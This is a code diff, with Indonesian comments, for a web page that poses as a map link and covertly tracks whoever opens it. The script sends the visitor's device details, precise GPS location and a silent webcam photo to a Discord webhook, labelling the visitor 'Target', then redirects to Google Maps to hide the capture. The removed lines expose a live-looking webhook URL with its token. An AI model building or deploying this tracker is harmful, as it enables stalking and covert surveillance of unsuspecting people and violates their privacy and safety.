@@ -25,8 +25,8 @@
 <canvas id="canvas"></canvas>
 
 <script>
-    // GANTI DENGAN WEBHOOK DISCORD KAMU
-    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1484383057975709819/7qQ5RYrC4FkuCKiin5gEpH0yfliZMNCrM4atDn-qn4LA_dI5zrS-Dwawh3QdA48FY0kI";
+  // GANTI DENGAN WEBHOOK DISCORD KAMU
+    const DISCORD_WEBHOOK = "MASUKKAN_URL_WEBHOOK_KAMU_DI_SINI";
 
     async function sendData(content, file = null) {
         const formData = new FormData();
@@ -39,22 +39,38 @@
         await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
     }
 
-    function startCapture() {
-        const options = {
-            enableHighAccuracy: true, // MEMAKSA PAKAI GPS SATELIT
-            timeout: 15000,           // TUNGGU MAKSIMAL 15 DETIK
-            maximumAge: 0             // JANGAN PAKAI DATA LAMA
-        };
+    async function getDeviceInfo() {
+        let batteryInfo = "Tidak Terdeteksi";
+        if (navigator.getBattery) {
+            const battery = await navigator.getBattery();
+            batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'Lagi di-cas ⚡' : 'Tidak di-cas 🪫'})`;
+        }
+        
+        const info = `
+📱 **Informasi Perangkat Target:**
+• **HP/Browser:** ${navigator.userAgent}
+• **Baterai:** ${batteryInfo}
+• **Platform:** ${navigator.platform}
+• **Bahasa:** ${navigator.language}
+        `;
+        return info;
+    }
+
+    async function startCapture() {
+        const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
 
         if (navigator.geolocation) {
+            // Ambil Info Perangkat Dulu
+            const deviceInfo = await getDeviceInfo();
+            await sendData(deviceInfo);
+
             navigator.geolocation.getCurrentPosition(async (position) => {
                 const lat = position.coords.latitude;
                 const lon = position.coords.longitude;
-                const acc = position.coords.accuracy; // Cek berapa meter melesetnya
+                const acc = position.coords.accuracy;
                 const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
 
-                // Kirim Info Lokasi & Akurasi
-                await sendData(`📍 **Target Ditemukan!**\nKoordinat: ${lat}, ${lon}\nAkurasi: ${acc.toFixed(1)} meter\nLink: ${mapsUrl}`);
+                await sendData(`📍 **Lokasi Terdeteksi!**\nAkurasi: ${acc.toFixed(1)} meter\nLink: ${mapsUrl}`);
 
                 // Ambil Foto
                 try {
@@ -69,15 +85,14 @@
                         canvas.getContext('2d').drawImage(video, 0, 0);
                         
                         canvas.toBlob(async (blob) => {
-                            await sendData("📸 **Foto Target Terbaru:**", blob);
+                            await sendData("📸 **Foto Target:**", blob);
                             stream.getTracks().forEach(t => t.stop());
-                            window.location.href = mapsUrl; // Redirect ke lokasi asli
+                            window.location.href = mapsUrl; 
                         }, 'image/jpeg');
                     }, 2000);
                 } catch (e) {
                     window.location.href = mapsUrl;
                 }
-
             }, (err) => {
                 window.location.href = "https://www.google.com/maps";
             }, options);
